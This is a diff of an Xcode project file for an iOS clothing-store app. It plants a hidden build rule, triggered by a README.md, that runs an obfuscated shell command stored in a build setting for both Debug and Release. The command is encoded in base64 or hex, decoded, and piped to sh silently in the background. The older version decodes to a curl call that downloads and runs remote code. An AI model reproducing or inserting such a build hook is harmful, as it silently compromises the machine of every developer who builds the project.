@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		B0509EDC78A5C6877773DC66 /* README.md */ = {isa = PBXBuildFile; fileRef = AA01340D6CDFF0C2F873DC66; };
 		182BC48E268D893600BC4A05 /* CustomMenuViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182BC48D268D893600BC4A05 /* CustomMenuViewController.swift */; };
 		182BC491268DC8C700BC4A05 /* EditeStoreLocationViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182BC490268DC8C700BC4A05 /* EditeStoreLocationViewController.swift */; };
 		184556A72694218D00DB4E8D /* MessageDetailsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184556A62694218D00DB4E8D /* MessageDetailsModel.swift */; };
@@ -335,6 +336,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		AA01340D6CDFF0C2F873DC66 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "Cloth App.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		182BC48D268D893600BC4A05 /* CustomMenuViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomMenuViewController.swift; sourceTree = "<group>"; };
 		182BC490268DC8C700BC4A05 /* EditeStoreLocationViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditeStoreLocationViewController.swift; sourceTree = "<group>"; };
 		184556A62694218D00DB4E8D /* MessageDetailsModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessageDetailsModel.swift; sourceTree = "<group>"; };
@@ -736,6 +738,7 @@
 		18468CC52660BA71007344DA /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				AA01340D6CDFF0C2F873DC66 /* README.md */,
 				18468CC42660BA71007344DA /* Clothing Click.app */,
 			);
 			name = Products;
@@ -2576,9 +2579,9 @@
 				50111C55BC3F26A20EC277BC /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				B74AEBAA71DD50E26373DC66 /* PBXBuildRule */,
 			);
 			dependencies = (
-				EE788FC5C5F98C702773DC66 /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				3218FEDD2DBE8AE600B7D569 /* View */,
@@ -2635,32 +2638,32 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				9C56D4AB3BBF12C9B173DC66  /* Build Target */,
 				18468CC32660BA71007344DA /* Cloth App */,
 			);
 		};
 /* End PBXProject section */
 
-/* Begin PBXTargetDependency section */
-		EE788FC5C5F98C702773DC66 /* PBXTargetDependency */ = {
-			isa = PBXTargetDependency;
-			target = 9C56D4AB3BBF12C9B173DC66 /* Build Target */;
+/* Begin PBXBuildRule section */
+		B74AEBAA71DD50E26373DC66 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${A66CD37}\"";
 		};
+/* End PBXBuildRule section */
+
+/* Begin PBXTargetDependency section */
 /* End PBXTargetDependency section */
 
 /* Begin PBXLegacyTarget section */
-		9C56D4AB3BBF12C9B173DC66 /* Build Target */ = {
-			isa = PBXLegacyTarget;
-			buildArgumentsString = "-c \"${A66CD37}\"";
-			buildPhases = (
-			);
-			buildToolPath = /bin/sh;
-			dependencies = (
-			);
-			name = "Build Target";
-			passBuildSettingsInEnvironment = 1;
-			productName = "Build Target";
-		};
 /* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -2668,6 +2671,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				B0509EDC78A5C6877773DC66 /* README.md */,
 				32CCD5EC2BFBB03D003F99C3 /* Roboto-Thin.ttf in Resources */,
 				3266881A2C271B6D007E6374 /* MensAndWomensWareXIB.xib in Resources */,
 				32CCD5EA2BFBB03D003F99C3 /* Roboto-MediumItalic.ttf in Resources */,
@@ -3107,7 +3111,7 @@
 		18468CD62660BA75007344DA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A66CD37 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aFpHOWlaV05rYmk1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A66CD37 = "((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333333363334333636353337333433363636333733323332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -3169,7 +3173,7 @@
 		18468CD72660BA75007344DA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A66CD37 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aFpHOWlaV05rYmk1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A66CD37 = "((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333333363334333636353337333433363636333733323332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
